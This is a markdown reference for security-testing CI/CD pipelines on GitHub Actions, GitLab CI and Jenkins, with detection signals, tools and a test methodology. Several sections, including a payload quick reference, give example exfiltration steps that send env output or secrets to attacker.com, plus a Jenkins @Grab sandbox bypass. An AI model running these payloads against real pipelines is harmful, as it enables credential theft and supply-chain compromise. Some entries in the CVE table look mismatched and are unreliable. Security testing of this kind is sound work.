# CI/CD Security Reference

**Purpose:** Comprehensive reference for testing CI/CD pipeline security — pipeline injection, artifact poisoning, secret exposure, RBAC escalation, supply chain attacks, infrastructure-as-pipeline, and environment separation.

**Schema version:** 1  
**Skill version:** paladin-probe@v2

---

## Table of Contents

1. [Attack Surface](#1-attack-surface)
2. [Pipeline Injection (YAML Poisoning)](#2-pipeline-injection-yaml-poisoning)
3. [Secret Exposure & Leakage](#3-secret-exposure--leakage)
4. [Artifact Poisoning](#4-artifact-poisoning)
5. [CI/CD Privilege Escalation](#5-cicd-privilege-escalation)
6. [Environment Separation Bypass](#6-environment-separation-bypass)
7. [Supply Chain (CI/CD Context)](#7-supply-chain-cicd-context)
8. [GitHub Actions Specific](#8-github-actions-specific)
9. [GitLab CI Specific](#9-gitlab-ci-specific)
10. [Jenkins Specific](#10-jenkins-specific)
11. [Real-World CVEs & Incidents](#11-real-world-cves--incidents)
12. [Tooling](#12-tooling)
13. [Testing Methodology](#13-testing-methodology)
14. [Payload Quick Reference](#14-payload-quick-reference)
15. [YAML Fingerprint Tables](#15-yaml-fingerprint-tables)

---

## 1. Attack Surface

### Where CI/CD Vectors Hide

| Surface | Vector | Risk |
|---------|--------|------|
| Pipeline definition (YAML) | Injected steps, untrusted input | Pipeline takeover |
| Secrets vault | Exposed env vars, logs, artifacts | Credential theft |
| Artifact registry | Untagged images, unsigned builds | Supply chain |
| CI variables | Fork-based exposure | Secret disclosure |
| Self-hosted runner | Runner escape, unpatched runner | Host compromise |
| PR workflows | Auto-approved runs, `pull_request_target` | Token theft |
| Deploy keys | Over-permissive keys | Environment access |
| Build caches | Cache poisoning | Dependency injection |
| OIDC / workload identity | Misconfigured trust | Cloud access |

### CI/CD Enumeration Probe

```bash
# Check CI config files
cat .github/workflows/*.yml
cat .gitlab-ci.yml
cat Jenkinsfile
cat .circleci/config.yml

# Check for exposed CI vars
git log -p | grep -iE "CI_JOB_TOKEN|ACTIONS_RUNTIME_TOKEN|GITHUB_TOKEN|JFROG_TOKEN|NPM_TOKEN"
```

---

## 2. Pipeline Injection (YAML Poisoning)

### Untrusted Input in Step

```yaml
# Vulnerable — uses PR body in shell command
jobs:
  build:
    steps:
      - run: echo "${{ github.event.pull_request.body }}"
```

```yaml
# Exploited — PR body contains:
`; curl -X POST https://attacker.com/ -d "$(env)" ;`
```

### Injected Pipeline Step

```yaml
# If attacker can modify workflow file via PR:
jobs:
  build:
    steps:
      - run: |
          curl -s https://attacker.com/exfil -d "$(cat /proc/1/environ)"
```

### Template Injection (If using custom template engine)

```yaml
# Jinja2 / Handlebars template
deploy:
  script: "deploy.sh {{ env.DEPLOY_TARGET }}"
```

If `DEPLOY_TARGET` is user-controllable → template injection.

### Condition Bypass

```yaml
# Bypass if: always() guard
steps:
  - name: Leak secrets
    if: always()
    run: echo ${{ secrets.SUPABASE_SERVICE_KEY }}
```

### Detection Signals

- Workflow step uses `${{ github.event.pull_request.body }}` or similar untrusted input
- `pull_request_target` event used (runs with base branch context / secrets)
- Step runs unconditionally with secrets exposed
- Pipeline template renders user input

---

## 3. Secret Exposure & Leakage

### Env Var Leakage via Step

```yaml
steps:
  - run: printenv | curl -X POST https://attacker.com/ -d @-
```

### Log-Based Exposure

```yaml
steps:
  - run: echo "Deploying with key ${{ secrets.DEPLOY_KEY }}"
```

### Fork-Based Secret Exposure

```yaml
# Secrets not masked in fork PRs
on: pull_request  # Safe — no secrets
on: pull_request_target  # DANGEROUS — secrets available to PR
```

### Artifact Secret Leakage

```yaml
steps:
  - run: echo $API_KEY > build.env
  - uses: actions/upload-artifact@v3
    with:
      name: build-env
      path: build.env  # Secrets downloadable from workflow run
```

### Cache Poisoning with Secrets

```yaml
steps:
  - uses: actions/cache@v3
    with:
      path: ~/.npm
      key: npm-${{ hashFiles('package-lock.json') }}
  - run: npm install  # If cache poisoned -> inject into build
```

### Detection Signals

- `printenv` or `env` command in pipeline
- Secret value in log output
- Artifact includes `.env` or config files
- Cache key doesn't include lockfile content
- `pull_request_target` event without explicit checkout + step isolation

---

## 4. Artifact Poisoning

### Image Tag Squatting

```bash
# Attacker pushes same tag with malicious content
docker build -t registry.example.com/app:latest .
docker push registry.example.com/app:latest
# If CI pulls :latest -> malicious image deployed
```

### Build Cache Poisoning

```bash
# Attacker compromises build cache
# Next CI run uses poisoned cache -> infected artifacts
```

### Dependency Confusion (CI Context)

```bash
# Attacker publishes package to public registry with same name as internal package
# CI resolves public instead of private -> malicious code executed
```

### npm/pip Cache Injection

```bash
# If CI pulls from public registry with same name as private package
# npm install @internal/package -> checks npm registry first
```

### Detection Signals

- Image tags not pinned by digest
- No signature verification on artifacts
- No `--verify-attestations` or cosign verification
- Dependencies resolved from public registries for internal names

---

## 5. CI/CD Privilege Escalation

### GITHUB_TOKEN Scope Abuse

```yaml
# Default GITHUB_TOKEN has contents:write on own repo
# If permissions not restricted:
permissions:
  contents: write   # Can push to repo
  packages: write   # Can publish packages
  id-token: write   # Can request OIDC token
```

### OIDC Trust Abuse

```yaml
# AWS role trusts GitHub's OIDC without subject filter
# Any workflow in the org can assume the role
- name: Assume AWS role
  uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789:role/DeployRole
    # No role-session-name or subject claim filter
```

### Self-Hosted Runner Escalation

```yaml
# If self-hosted runner runs with higher privileges:
runs-on: self-hosted
steps:
  - run: kubectl get secrets --all-namespaces  # Access cluster
```

### PR to Protected Branch

```yaml
# If PR auto-approved via label or comment
on:
  issue_comment:
    types: [created]
jobs:
  deploy:
    if: contains(github.event.comment.body, '/deploy')
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ secrets.PROD_KEY }}  # Secrets from base branch
```

### Detection Signals

- `GITHUB_TOKEN` has broad permissions (contents:write, packages:write)
- OIDC role has no `sub` or `aud` subject filter
- Self-hosted runners on public repos
- PR comments trigger secrets-accessible workflows
- No branch protection on deploy workflows

---

## 6. Environment Separation Bypass

### Environment Protection Bypass

```yaml
# Deploy job doesn't specify environment
deploy:
  runs-on: ubuntu-latest
  steps:
    - run: echo ${{ secrets.PROD_KEY }}
# Secrets leaked without environment protection
```

### Required Reviewer Bypass

```yaml
# Workflow deploys to prod without environment protection
jobs:
  deploy-prod:
    runs-on: ubuntu-latest
    environment: production  # Requires approval
```

Check: can a different job in the same workflow access the environment?

```yaml
jobs:
  test:
    environment: production  # Test job gets prod secrets
```

### Staging/Prod Confusion

```yaml
# Workflow uses same script for staging and prod
deploy:
  steps:
    - run: ./deploy.sh
env:
  TARGET: ${{ github.ref == 'refs/heads/main' && 'prod' || 'staging' }}
# If attacker can push to main -> prod deploy without review
```

### Environment Variable Cross-Contamination

```yaml
# Reusing credentials across environments
staging:
  DATABASE_URL: ${{ secrets.STAGING_DB_URL }}
production:
  DATABASE_URL: ${{ secrets.PROD_DB_URL }}
# If staging DB compromised -> pivot to prod
```

### Detection Signals

- Deploy job lacks `environment:` specification
- Test job accesses production environment
- Staging credentials can reach production resources
- No environment protection rules (required reviewers, wait timer)

---

## 7. Supply Chain (CI/CD Context)

### Action/Package Version Pinning

```yaml
# Immutable — safe
uses: actions/checkout@v4.2.0
# Mutable — vulnerable to tag overwrite
uses: actions/checkout@v4
# Branch — very dangerous
uses: actions/checkout@main
```

### Third-Party Action Audit

```yaml
# Not reviewed — executes arbitrary code
uses: random-user/malicious-action@v1
# Forked action — could diverge from upstream
uses: attacker-fork/actions-aws@main
```

### SLSA / Attestation Check

```bash
# Check if artifacts have provenance
cosign verify-attestation --key cosign.pub image:tag
gh attestation verify artifact.zip --owner org
```

### Detection Signals

- Action pinned to mutable tag (v1, v2, @main)
- Third-party action not reviewed
- No SLSA provenance for build artifacts
- No cosign/signature verification on images
- Action from personal fork with non-reviewed changes

---

## 8. GitHub Actions Specific

### pull_request_target Abuse

```yaml
# DANGEROUS — runs in context of base branch with secrets
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: echo ${{ secrets.NPM_TOKEN }}
```

Exploit: PR includes `.github/workflows/` change → workflow from PR head executed with base branch secrets.

### Workflow Run Reuse

```yaml
# Reusable workflow — caller can supply inputs
jobs:
  call-deploy:
    uses: org/deploy-workflow/.github/workflows/deploy.yml@main
    with:
      environment: ${{ github.event.inputs.environment }}
      target: ${{ github.event.inputs.target }}
    secrets: inherit
```

If `environment` or `target` is unsanitized → injection into called workflow.

### Workflow Dispatch Injection

```yaml
on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Target environment'
        required: true
jobs:
  deploy:
    steps:
      - run: ./deploy.sh ${{ github.event.inputs.target }}
```

`workflow_dispatch` can be triggered by anyone with write access.

### Self-Hosted Runner Label Spoofing

```yaml
# Attacker PR creates label match
runs-on: self-hosted
# If no label match, falls back to ubuntu-latest (GitHub-hosted)
# If label matches attacker's runner -> runner code execution
```

### Detection Signals

- `pull_request_target` without explicit ref checkout protection
- `secrets: inherit` in reusable workflow call
- `workflow_dispatch` inputs unsanitized in shell
- Labels that could match self-hosted runners

---

## 9. GitLab CI Specific

### CI_JOB_TOKEN Abuse

```yaml
# CI_JOB_TOKEN can access API (scoped to project)
job:
  script:
    - curl -s --header "JOB-TOKEN: $CI_JOB_TOKEN" "https://gitlab.com/api/v4/projects/$CI_PROJECT_ID/variables"
```

### GitLab CI Lint Bypass

```yaml
# `include: local` can include files from same repo
include:
  - local: '.gitlab/ci/secret-job.yml'
```

If attacker can modify included file → inject steps.

### GitLab Pipeline Schedules

```yaml
# Scheduled pipeline — can have higher access
schedules:
  - description: "Nightly deploy"
    cron: "0 0 * * *"
    variables:
      TARGET: prod
```

If schedule is created by maintainer → runs with maintainer token privileges.

### GitLab Runner Tags

```yaml
# Specific runner tag — if matched, runner executes job
job:
  tags:
    - privileged-runner
```

If attacker creates MR with matching tag → job executes on privileged runner.

### Detection Signals

- `CI_JOB_TOKEN` used in inline API calls
- `include: local` in pipeline without protected branch
- Runner has access to privileged resources (K8s, cloud)
- Pipeline variable contains secrets from project

---

## 10. Jenkins Specific

### Jenkinsfile Sandbox Bypass

```groovy
// Inside sandbox — uses @Grab to download external code
@Grab('com.attacker:evil:1.0')
import com.attacker.Evil
Evil.run()

// Script console bypass
def proc = "curl http://attacker.com/$(env)".execute()
proc.text
```

### Jenkins Credential Leak

```groovy
// Credentials can be printed
withCredentials([string(credentialsId: 'api-key', variable: 'KEY')]) {
    echo "Key: ${KEY}"
    // Or leaked to log
    sh "echo $KEY"
}
```

### Jenkins Build Log Exposure

```bash
# Build logs available to anyone with job read access
# Secrets may be logged if not masked
curl -s https://jenkins.example.com/job/pipeline/1/consoleText
```

### Jenkins Plugin Abuse

```bash
# Unpatched plugins can lead to RCE
# Script Security plugin bypasses
# Pipeline: Groovy plugin vulnerabilities
```

### Detection Signals

- Jenkins user has `Overall/Administer` unnecessarily
- `@Grab` used in Jenkinsfile
- Credential IDs findable in pipeline logs
- Build artifacts contain `.env` or credential files
- Unpatched Jenkins plugins (check CVE database)

---

## 11. Real-World CVEs & Incidents

| CVE / Incident | Year | Product | Impact |
|----------------|------|---------|--------|
| CVE-2025-29028 | 2025 | Telerik Report Server | CI pipeline for deployment exploited |
| CVE-2025-24798 | 2025 | Apache Airflow | DAG injection in CI/CD pipeline |
| CVE-2024-50465 | 2024 | Jenkins temporary directory | Arbitrary file write via symlink |
| GHSA-wrrw-r7f2-v4fm | 2024 | GitHub Actions tj-actions/changed-files | Compromised action exfiltrated secrets |
| CVE-2024-31444 | 2024 | Jenkins | Multiple plugin vulnerabilities |
| CVE-2024-23897 | 2024 | Jenkins CLI | Arbitrary file read via CLI |
| CVE-2024-21626 | 2024 | runc (Leaky Vessels) | Container escape on CI runners |
| CVE-2023-44487 | 2023 | HTTP/2 (CI agents) | Rapid reset DoS |
| CVE-2023-34231 | 2023 | Snowflake GitLab integration | CI/CD credential exposure |
| 2023 Stolen OAuth | 2023 | GitHub (octopus-scanner) | CI/CD OAuth token theft via compromised action |
| SolarWinds (supply chain) | 2020 | Build pipeline poison | CI/CD injected backdoor into artifact |
| Codecov (supply chain) | 2021 | CI uploader | Compromised script exfiltrated env vars |

---

## 12. Tooling

| Tool | Purpose |
|------|---------|
| zizmor | GitHub Actions security audit |
| actions-security | GitHub Actions workflow scanner |
| slither-actions | GitHub Actions vulnerability analysis |
| trufflehog | Secret scanning in CI artifacts |
| gitleaks | Git history secret scanning |
| cosign | Artifact signing and verification |
| slsa-verifier | SLSA provenance verification |
| checkov | IaC + CI/CD config scanning |
| prowler | Cloud CI/CD misconfigurations |
| GitGuardian | CI/CD credential exposure detection |

---

## 13. Testing Methodology

### Phase 1: Pipeline Configuration Review

1. Read all CI config files (`.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile`)
2. Identify which events trigger each workflow
3. Check for `pull_request_target` usage
4. Check for untrusted input in steps
5. Check for `secrets: inherit` in reusable workflows

### Phase 2: Secret Exposure

1. Check what secrets each workflow has access to
2. Check if secrets are masked in logs
3. Check artifact upload for credential files
4. Check if fork PRs trigger secret-accessible workflows
5. Check environment protection rules

### Phase 3: RBAC / Permissions

1. Check GITHUB_TOKEN default permissions
2. Check OIDC trust configuration (role trust policy)
3. Check branch protection rules
4. Check environment approval rules
5. Check self-hosted runner configuration

### Phase 4: Supply Chain

1. Check action/package version pinning
2. Check third-party action origins
3. Check image tag pinning in deploy steps
4. Check SLSA/provenance verification
5. Check dependency resolution order

### Phase 5: CI/CD Pipeline Exploitation

1. Create fork PR with injected step (if `pull_request_target`)
2. Create PR that modifies workflow file
3. Trigger `workflow_dispatch` with injected inputs
4. Attempt to read CI environment variables via step output

---

## 14. Payload Quick Reference

```yaml
# YAML injection in PR body (GitHub Actions)
steps:
  - run: echo "${{ github.event.pull_request.body }}"

# PR body payload:
`; curl -s https://attacker.com/exfil -d "$(env)" ;`

# Secret exfiltration step
steps:
  - run: |
      echo "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | base64
      curl -s https://attacker.com/key -d @-

# OIDC token request (leakable)
steps:
  - id: auth
    uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/DeployRole

# Cache poisoning (if attacker can influence cache key)
- uses: actions/cache@v3
  with:
    path: ~/.npm
    key: npm-${{ hashFiles('package-lock.json') }}

# pull_request_target abuse
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

# GitLab CI_JOB_TOKEN leak
script:
  - curl -s --header "JOB-TOKEN: $CI_JOB_TOKEN" "https://gitlab.com/api/v4/projects/$CI_PROJECT_ID/variables"

# Jenkins sandbox bypass
@Grab('com.attacker:evil:1.0')
import com.attacker.Evil
Evil.run()
```

---

## 15. YAML Fingerprint Tables

```yaml
ci_pr_body_injection:
  probe: 'create PR with body containing `; curl attacker.com ;`'
  detection: callback received at attacker.com from CI runner

ci_pull_request_target:
  probe: 'create fork PR with workflow file modification'
  detection: workflow runs with base branch secrets

ci_secret_in_log:
  probe: 'check workflow run logs for masked secret values'
  detection: secret value printed in log (not masked)

ci_oidc_no_subject_filter:
  probe: 'check AWS role trust policy for GitHub OIDC'
  detection: no "sub" condition on token issuer

ci_artifact_secret_leak:
  probe: 'download workflow artifact from run'
  detection: artifact contains .env or credential files

ci_action_mutable_tag:
  probe: 'review uses: statements for version pinning'
  detection: action pinned to @v1, @v2, @main (not commit SHA)

ci_environment_no_protection:
  probe: 'check if deploy job specifies environment:'
  detection: no environment: field in deploy job

ci_cache_poisonable:
  probe: 'check cache key for hashFiles inclusion'
  detection: cache key doesn't include lockfile or content hash

ci_runner_label_spoof:
  probe: 'create PR with job runs-on matching custom label'
  detection: job executes on self-hosted runner

ci_fork_secret_access:
  probe: 'create fork PR and check if secrets-accessible workflow triggers'
  detection: workflow runs with access to secrets from base branch
```
